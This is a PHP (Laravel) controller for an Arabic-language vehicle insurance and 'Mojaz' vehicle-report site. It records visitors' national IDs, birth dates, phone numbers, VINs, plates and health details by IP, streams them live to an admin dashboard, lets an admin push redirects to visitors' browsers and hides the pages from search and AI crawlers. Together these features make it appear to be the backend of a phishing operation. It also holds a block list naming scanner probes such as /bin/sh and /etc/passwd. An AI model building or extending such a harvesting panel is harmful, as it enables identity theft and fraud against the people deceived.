<?php

namespace App\Http\Controllers;

use App\Events\CustomerActivityUpdated;
use App\Http\Requests\TrackCustomerRequest;
use App\Http\Requests\TrackDetailsRequest;
use App\Http\Requests\TrackMojazRequest;
use App\Http\Requests\UpdatePageRequest;
use App\Models\CustomerActivity;
use App\Models\CustomerProfile;
use App\Services\CarrierDetectionService;
use App\Services\CustomerCacheService;
use App\Services\DeviceDetectionService;
use App\Support\CustomerBroadcastChannel;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Log;

class CustomerTrackingController extends Controller
{
    /**
     * Upsert tracked customer data from frontend form submissions.
     * Identifies the customer by IP address.
     *
     * POST /api/customer/track
     */
    public function track(TrackCustomerRequest $request): JsonResponse
    {
        $validated = $request->validated();

        $ip = $request->ip();

        $updateData = array_filter([
            'national_id' => $validated['national_id'],
            'birth_month' => isset($validated['birth_month']) ? str_pad($validated['birth_month'], 2, '0', STR_PAD_LEFT) : null,
            'birth_year' => $validated['birth_year'] ?? null,
            'sequence_number' => $validated['sequence_number'] ?? null,
            'customs_card' => $validated['customs_card'] ?? null,
            'manufacturing_year' => $validated['manufacturing_year'] ?? null,
            'insurance_type' => $validated['insurance_type'] ?? null,
            'registration_type' => $validated['registration_type'] ?? null,
            'current_page' => $validated['current_page'] ?? '/insurance/vehicle-details',
            'device_type' => DeviceDetectionService::detectType($request),
            'device_browser' => DeviceDetectionService::detectBrowser($request),
        ], fn ($v) => $v !== null);

        $customer = CustomerProfile::createOrUpdateByIP($ip, $updateData);

        if (! empty($validated['nationality'])) {
            $extraData = $customer->extra_data ?? [];

            if (($extraData['nationality'] ?? null) !== $validated['nationality']) {
                $extraData['nationality'] = $validated['nationality'];
                $customer->update(['extra_data' => $extraData]);
            }
        }

        // Record customer activity (non-critical — never block customer)
        try {
            CustomerActivity::create([
                'customer_profile_id' => $customer->id,
                'customer_name' => $customer->full_name ?? 'زائر',
                'phone' => $customer->phone_number ?? '',
                'stage' => $updateData['current_page'] ?? 'vehicle-info',
                'activity_type' => 'form_submission',
                'description' => 'تعبئة بيانات المركبة',
                'status' => self::resolveActivityStatus($updateData['current_page'] ?? ''),
            ]);
        } catch (\Exception $e) {
            // Silent fail — activity logging should never break customer flow
        }

        // Broadcast to admin dashboard when new customer or data changes
        // Throttled: max once per 15 seconds per IP to prevent broadcast storm
        if ($customer->wasRecentlyCreated || $customer->wasChanged()) {
            CustomerCacheService::flush();
            $broadcastKey = "broadcast:throttle:{$ip}";
            if (! Cache::has($broadcastKey)) {
                Cache::put($broadcastKey, true, 15);
                try {
                    broadcast(new CustomerActivityUpdated(
                        $customer->id,
                        $customer->ip_address,
                        $customer->current_page,
                        $customer->is_active,
                        'customer_tracked'
                    ));
                } catch (\Exception $e) {
                    // Silent fail — broadcasting should never block the customer
                }
            }
        }

        return response()->json([
            'success' => true,
            'message' => 'تم حفظ البيانات بنجاح',
            'customer_ip' => $ip,
            'city' => $customer->city ?? $customer->location_city ?? null,
        ]);
    }

    /**
     * Lightweight page update — just updates current_page and activity timestamp.
     * Used by useVisitorTracking composable on page mount.
     *
     * POST /api/customer/page
     */
    public function updatePage(UpdatePageRequest $request): JsonResponse
    {
        $startedAt = microtime(true);
        $validated = $request->validated();

        $ip = $request->ip();
        $page = $validated['current_page'];
        $sessionId = (string) ($request->header('X-Session-Token') ?: ($validated['session_id'] ?? ''));
        $identityKey = $sessionId !== '' ? hash('sha256', $sessionId) : $ip;

        // Reject garbage paths (browser internals, DevTools probes, static assets, etc.)
        if (preg_match('#^/?(\.|api/|favicon|robots|sitemap|well-known|images/|build/|Videos/|storage/|vendor/|node_modules/)#i', $page)) {
            return $this->trackingResponse(['success' => true, 'customer_ip' => $ip], $startedAt, $ip, 'page_ignored_garbage');
        }

        // Reject static asset file extensions
        if (preg_match('#\.(png|jpg|jpeg|gif|svg|ico|css|js|woff2?|ttf|eot|map|webp|avif|json|xml|txt)$#i', $page)) {
            return $this->trackingResponse(['success' => true, 'customer_ip' => $ip], $startedAt, $ip, 'page_ignored_asset');
        }
        // Reject bot / vulnerability scanner paths — silently drop without creating DB records
        if (preg_match('#(wp-login|wp-admin|wp-content|wp-includes|wordpress|xmlrpc\.php|\.env|/\.git|phpmyadmin|pma|adminer|cgi-bin|/bin/sh|/etc/passwd|ReportServer|owa/|/autodiscover|/aspnet_client|\.asp$|\.aspx$|\.jsp$|/manager/html|/solr|/jenkins|/actuator|/graphql|/admin\.php|/debug|/console|/setup|/install|/shell|/eval|/exec|/cmd|/connect|/proxy|/remote|/backup)#i', $page)) {
            return $this->trackingResponse(['success' => true, 'customer_ip' => $ip], $startedAt, $ip, 'page_ignored_scanner');
        }

        // Reject known bot/crawler user-agents — they are not real customers
        $ua = $request->userAgent() ?? '';
        if (preg_match('/\b(Googlebot|bingbot|Baiduspider|YandexBot|DuckDuckBot|Slurp|facebot|ia_archiver|MJ12bot|AhrefsBot|SemrushBot|DotBot|PetalBot|GPTBot|ClaudeBot|Applebot|Bytespider|HeadlessChrome|PhantomJS)\b/i', $ua)) {
            return $this->trackingResponse(['success' => true, 'customer_ip' => $ip], $startedAt, $ip, 'page_ignored_bot');
        }

        // ── Redis-first fast-path ────────────────────────────────────
        // Heartbeats arrive every 10s. When the visitor stays on the same page,
        // we MUST avoid touching the DB (no transaction, no FOR UPDATE, no
        // last_activity_at write). We refresh visitor:last_seen instead, and
        // a scheduled job reconciles last_activity_at to the DB.
        //
        // TTL = 180s (matches `customers:mark-inactive --minutes=3` default).
        $lastPageKey = "visitor:last_page:{$identityKey}";
        $lastSeenKey = "visitor:last_seen:{$identityKey}";
        $cachedPage  = Cache::get($lastPageKey);

        if ($cachedPage !== null && $cachedPage === $page) {
            // Same page → silent heartbeat: refresh TTLs only, no DB work.
            Cache::put($lastPageKey, $page, 180);
            Cache::put($lastSeenKey, time(), 180);

            // Preserve admin-initiated redirect polling (atomic read+delete).
            $pendingRedirect = $sessionId !== ''
                ? Cache::pull(CustomerBroadcastChannel::pendingRedirectCacheKey($sessionId))
                : null;

            $response = ['success' => true, 'customer_ip' => $ip];
            if ($pendingRedirect && $pendingRedirect !== $page) {
                $response['redirect_to'] = $pendingRedirect;
            }

            return $this->trackingResponse($response, $startedAt, $ip, 'page_fast_path');
        }

        // ── Slow path: page changed OR first heartbeat (cache miss) ──
        $dbStartedAt = microtime(true);
        $customer = CustomerProfile::createOrUpdateByIP($ip, [
            'current_page' => $page,
        ]);
        $dbDurationMs = $this->durationMs($dbStartedAt);

        // Seed the fast-path cache so subsequent heartbeats stay silent.
        $cacheStartedAt = microtime(true);
        Cache::put($lastPageKey, $page, 180);
        Cache::put($lastSeenKey, time(), 180);
        $cacheDurationMs = $this->durationMs($cacheStartedAt);

        // Record page view activity (only on actual page change, never on heartbeat)
        if ($customer->wasRecentlyCreated || $customer->wasChanged('current_page')) {
            try {
                CustomerActivity::create([
                    'customer_profile_id' => $customer->id,
                    'customer_name' => $customer->full_name ?? 'زائر',
                    'phone' => $customer->phone_number ?? '',
                    'stage' => $page,
                    'activity_type' => 'page_view',
                    'description' => 'مشاهدة صفحة',
                    'status' => self::resolveActivityStatus($page),
                ]);
            } catch (\Exception $e) {
                // Silent fail — activity logging should never break customer flow
            }
        }

        // Set device info on first creation
        if ($customer->wasRecentlyCreated) {
            $customer->update([
                'device_type' => DeviceDetectionService::detectType($request),
                'device_browser' => DeviceDetectionService::detectBrowser($request),
            ]);
        }

        // Broadcast only when page actually changed or customer is new (prevents heartbeat spam)
        // Throttled: max once per 15 seconds per IP
        if ($customer->wasRecentlyCreated || $customer->wasChanged('current_page')) {
            if ($customer->wasRecentlyCreated) {
                CustomerCacheService::flush();
            }
            $broadcastKey = "broadcast:throttle:{$identityKey}";
            if (! Cache::has($broadcastKey)) {
                Cache::put($broadcastKey, true, 15);
                try {
                    broadcast(new CustomerActivityUpdated(
                        $customer->id,
                        $customer->ip_address,
                        $customer->current_page,
                        $customer->is_active,
                        'page_view'
                    ));
                } catch (\Exception $e) {
                    // Silent fail — broadcasting should never block the customer
                }
            }
        }

        // Check for admin-initiated redirect (polling fallback when WebSocket is down).
        // Cache::pull reads and deletes atomically so each redirect fires only once.
        $pendingRedirect = $sessionId !== ''
            ? Cache::pull(CustomerBroadcastChannel::pendingRedirectCacheKey($sessionId))
            : null;

        $response = [
            'success' => true,
            'customer_ip' => $ip,
        ];

        if ($pendingRedirect && $pendingRedirect !== $page) {
            $response['redirect_to'] = $pendingRedirect;
        }

        return $this->trackingResponse($response, $startedAt, $ip, 'page_slow_path', [
            'db_duration_ms' => $dbDurationMs,
            'cache_duration_ms' => $cacheDurationMs,
            'created' => $customer->wasRecentlyCreated,
            'changed' => $customer->wasChanged('current_page'),
        ]);
    }

    /**
     * Lightweight endpoint — returns only the customer's IP.
     * Used by the redirect-listener setup to avoid an extra POST to /customer/page.
     *
     * GET /api/customer/ip
     */
    public function getIp(Request $request): JsonResponse
    {
        $startedAt = microtime(true);
        $ip = $request->ip();

        Log::info('[TrackingAPI] setup start ip=' . $ip);

        return $this->trackingResponse([
            'customer_ip' => $request->ip(),
        ], $startedAt, $ip, 'ip_lookup');
    }

    /**
     * Track Mojaz vehicle inspection form data.
     * Called from MojazPage Step 1 on form submission.
     *
     * POST /api/customer/track-mojaz
     */
    public function trackMojaz(TrackMojazRequest $request): JsonResponse
    {
        $validated = $request->validated();
        $ip = $request->ip();

        $phone = $validated['mobile_number'];

        $updateData = array_filter([
            'sequence_number' => $validated['sequence_number'],
            'phone_number' => $phone,
            'phone_carrier' => CarrierDetectionService::detect($phone),
            'manufacturing_year' => $validated['manufacturing_year'],
            'vehicle_make' => $validated['vehicle_make'],
            'vehicle_model' => $validated['vehicle_model'],
            'plate_number' => $validated['plate_number'],
            'vin' => strtoupper($validated['vin']),
            'current_page' => $validated['current_page'] ?? '/motorapp/Home/Mojaz',
            'device_type' => DeviceDetectionService::detectType($request),
            'device_browser' => DeviceDetectionService::detectBrowser($request),
        ], fn ($v) => $v !== null);

        $customer = CustomerProfile::createOrUpdateByIP($ip, $updateData);

        // Record customer activity
        try {
            CustomerActivity::create([
                'customer_profile_id' => $customer->id,
                'customer_name' => $customer->full_name ?? 'زائر',
                'phone' => $phone,
                'stage' => 'mojaz',
                'activity_type' => 'form_submission',
                'description' => 'تعبئة بيانات موجز',
                'status' => 'active',
            ]);
        } catch (\Exception $e) {
            // Silent fail
        }

        // Broadcast to admin dashboard
        // Throttled: max once per 15 seconds per IP
        if ($customer->wasRecentlyCreated || $customer->wasChanged()) {
            CustomerCacheService::flush();
            $broadcastKey = "broadcast:throttle:{$ip}";
            if (! Cache::has($broadcastKey)) {
                Cache::put($broadcastKey, true, 15);
                try {
                    broadcast(new CustomerActivityUpdated(
                        $customer->id,
                        $customer->ip_address,
                        $customer->current_page,
                        $customer->is_active,
                        'mojaz_tracked'
                    ));
                } catch (\Exception $e) {
                    // Silent fail
                }
            }
        }

        return response()->json([
            'success' => true,
            'message' => 'تم حفظ بيانات موجز بنجاح',
            'customer_ip' => $ip,
        ]);
    }

    /**
     * Update tracked customer with vehicle details form data.
     * Called from VehicleDetailsPage on form submission.
     *
     * POST /api/customer/track-details
     */
    public function trackDetails(TrackDetailsRequest $request): JsonResponse
    {
        $validated = $request->validated();

        $ip = $request->ip();

        $phone = $validated['phone'] ?? null;

        $updateData = array_filter([
            'full_name' => $validated['full_name'] ?? null,
            'phone_number' => $phone,
            'phone_carrier' => $phone ? CarrierDetectionService::detect($phone) : null,
            'email' => $validated['email'] ?? null,
            'insurance_purpose' => $validated['purpose_of_use'] ?? $validated['usage_purpose'] ?? null,
            'insurance_type' => $validated['insurance_type'] ?? null,
            'vehicle_price' => $validated['estimated_value'] ?? null,
            'region' => $validated['region'] ?? null,
            'city' => $validated['city'] ?? null,
            'vehicle_type' => $validated['vehicle_type'] ?? null,
            'repair_method' => $validated['repair_method'] ?? null,
            'has_additional_driver' => $validated['has_additional_driver'] ?? null,
            'additional_driver_name' => $validated['additional_driver_name'] ?? null,
            'additional_driver_national_id' => $validated['additional_driver_national_id'] ?? null,
            'additional_driver_birth_date' => $validated['additional_driver_birth_date'] ?? null,
        ], fn ($v) => $v !== null);

        if (! empty($validated['policy_start_date'])) {
            $updateData['policy_start_date'] = $validated['policy_start_date'];
        }

        if (! empty($validated['current_page'])) {
            $updateData['current_page'] = $validated['current_page'];
        }

        // Collect extra details into extra_data JSON
        $extraFields = [
            'night_parking',
            'expected_km',
            'transmission_type',
            'accident_counts',
            'education',
            'work_location',
            'children_under_16',
            'car_modification',
            'modification_desc',
            'has_trailer',
            'trailer_value',
            'foreign_license',
            'health_conditions',
            'traffic_violations',
            'drivers',
        ];

        $extraData = [];
        foreach ($extraFields as $field) {
            if (isset($validated[$field]) && $validated[$field] !== null && $validated[$field] !== '') {
                $extraData[$field] = $validated[$field];
            }
        }

        if (! empty($extraData)) {
            // Upsert first, then merge extra_data on the loaded model (avoids extra SELECT)
            $customer = CustomerProfile::createOrUpdateByIP($ip, $updateData);
            $existingExtra = $customer->extra_data ?? [];
            $customer->update(['extra_data' => array_merge($existingExtra, $extraData)]);
        } else {
            $customer = CustomerProfile::createOrUpdateByIP($ip, $updateData);
        }

        // Set device info on first creation
        if ($customer->wasRecentlyCreated) {
            $customer->update([
                'device_type' => DeviceDetectionService::detectType($request),
                'device_browser' => DeviceDetectionService::detectBrowser($request),
            ]);
        }

        // Record customer activity (consistent with track() and trackMojaz())
        try {
            CustomerActivity::create([
                'customer_profile_id' => $customer->id,
                'customer_name' => $customer->full_name ?? 'زائر',
                'phone' => $customer->phone_number,
                'stage' => $validated['current_page'] ?? 'details',
                'activity_type' => 'form_submission',
                'description' => 'تعبئة بيانات التفاصيل',
                'status' => self::resolveActivityStatus($validated['current_page'] ?? 'details'),
            ]);
        } catch (\Exception $e) {
            // Silent fail
        }

        // Broadcast to admin dashboard when details are submitted
        // Throttled: max once per 15 seconds per IP
        if ($customer->wasRecentlyCreated || $customer->wasChanged()) {
            CustomerCacheService::flush();
            $broadcastKey = "broadcast:throttle:{$ip}";
            if (! Cache::has($broadcastKey)) {
                Cache::put($broadcastKey, true, 15);
                try {
                    broadcast(new CustomerActivityUpdated(
                        $customer->id,
                        $customer->ip_address,
                        $customer->current_page,
                        $customer->is_active,
                        'details_submitted'
                    ));
                } catch (\Exception $e) {
                    // Silent fail — broadcasting should never block the customer
                }
            }
        }

        return response()->json([
            'success' => true,
            'message' => 'تم تحديث البيانات بنجاح',
            'customer_ip' => $ip,
        ]);
    }

    /**
     * Resolve activity status from the page path.
     * Confirmation pages → completed, rejection pages → failed, everything else → active.
     */
    private static function resolveActivityStatus(string $page): string
    {
        if (str_contains($page, 'confirmation') || str_contains($page, 'success') || str_contains($page, 'order-confirm')) {
            return 'completed';
        }

        if (str_contains($page, 'rejected') || str_contains($page, 'failed') || str_contains($page, 'cancelled') || str_contains($page, 'expired')) {
            return 'failed';
        }

        return 'active';
    }

    private function trackingResponse(array $payload, float $startedAt, string $ip, string $stage, array $context = []): JsonResponse
    {
        $totalDurationMs = $this->durationMs($startedAt);
        $logContext = array_merge($context, [
            'ip' => $ip,
            'stage' => $stage,
            'total_duration_ms' => $totalDurationMs,
        ]);

        if ($totalDurationMs >= 500 || $stage === 'ip_lookup') {
            Log::info('[TrackingAPI] total duration_ms=' . $totalDurationMs . ' stage=' . $stage . ' ip=' . $ip, $logContext);
        } else {
            Log::debug('[TrackingAPI] total duration_ms=' . $totalDurationMs . ' stage=' . $stage . ' ip=' . $ip, $logContext);
        }

        return response()->json($payload);
    }

    private function durationMs(float $startedAt): int
    {
        return (int) round((microtime(true) - $startedAt) * 1000);
    }
}
